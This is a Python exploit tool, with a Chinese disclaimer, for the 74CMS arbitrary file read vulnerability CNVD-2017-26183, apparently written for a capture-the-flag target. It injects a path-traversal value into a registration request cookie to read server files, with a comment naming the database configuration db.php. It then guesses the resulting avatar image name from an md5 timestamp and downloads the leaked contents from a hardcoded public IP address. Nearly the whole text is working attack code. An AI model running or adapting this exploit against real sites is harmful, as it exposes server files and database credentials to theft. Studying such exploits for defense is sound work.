"""
声明：
本文为 漏洞编号CNVD-2017-26183 ，即 74CMS 任意文件读取漏洞利用工具源码内容
文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
更多介绍请访问笔者博客：0xtlu.github.io

注：
1. uid+time() 构成图片名，由于网路问题 time() 会出现一定偏差导致无法的到文件的正确名称
2. 因本工具没有设置爆破 time() 功能，故多运行几次本工具大致可以，反之，需要爆破请求的时间戳
"""
from requests import Session
from time import time, strftime
from hashlib import md5


# 读取内容写入图片文件
def text_read():
    print('正在写入读取数据……')

    # 待检测 URL
    url = 'http://127.0.0.1/index.php?m=&c=members&a=register'

    # 待读取文件
    # 读取数据库配置文件：../../../../Application/Common/Conf/db.php
    read_file = '../../../../../../../../this_is_flag'

    uid = str(int(time()) % 10000000)

    username = md5(uid.encode(encoding='utf-8')).hexdigest()[19:25]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Cookie': 'members_bind_info[temp_avatar]={read_file}; members_bind_info[type]=qq; members_uc_info[password]=admin123; members_uc_info[uid]={uid}; members_uc_info[username]=tql{username}'.format(
            read_file=read_file, uid=uid, username=username),
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = 'ajax=1&reg_type=2&utype=2&org=bind&ucenter=bind'

    time_stamp = str(int(time()) + 2)

    response = Session().post(url=url, headers=headers, data=data, timeout=5)
    # print(time_stamp)
    if (response.status_code == 404):
        print('图片成功写入数据！')
        return (uid + time_stamp)
    else:
        print('数据写入失败！')
        return '666'


# 图片名获取与图片下载
def jpg_data(flag):
    print('开始读取图片数据')
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0'}

    if (flag != '666'):
        jpgname = md5((flag).encode(encoding='utf-8')).hexdigest()
        jpg_url = 'http://106.15.50.112:8019/data/upload/avatar/{daytime}/{jpgname}.jpg'.format(
            daytime=strftime('%y%m/%d'), jpgname=jpgname)
        response = Session().get(url=jpg_url, headers=headers, timeout=5)
        print(jpg_url)
        if (response.status_code == 200):
            jpg_data = response.content
            if (jpg_data != None):
                print('滴！您有一份图片数据已到账：')
                print(jpg_data)
                # 读取的数据保存
                with open('./jpg_data.txt', 'wb') as fp:
                    fp.write(jpg_data)
                    fp.close()
        else:
            print('很遗憾，无法读到图片！\n这大致跟编者预设的时间戳有些差别所导致！')


if (__name__ == '__main__'):
    flag = text_read()
    jpg_data(flag)
